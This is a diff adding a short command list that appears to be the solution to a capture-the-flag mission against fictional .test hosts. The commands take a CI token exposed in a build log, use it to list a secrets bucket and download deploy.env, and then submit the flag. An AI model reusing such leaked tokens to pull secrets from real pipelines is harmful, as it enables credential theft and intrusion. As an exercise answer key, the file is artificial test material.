@@ -1,0 +1,10 @@
+# Season 6, mission 2: the pipeline's token
+curl https://ci.alto.test/
+curl https://ci.alto.test/builds/412/log
+curl -H "Authorization: Bearer nmb_ci_4c81e7" https://iam.alto.test/whoami
+curl -H "Authorization: Bearer nmb_ci_4c81e7" https://storage.alto.test/alto-secrets/
+curl -H "Authorization: Bearer nmb_ci_4c81e7" https://storage.alto.test/alto-secrets/deploy.env
+submit FLAG{alto-ci-token-9a17}
+review dossier/pipeline.yml
+review dossier/pipeline.yml 10
+review dossier/pipeline.yml 14
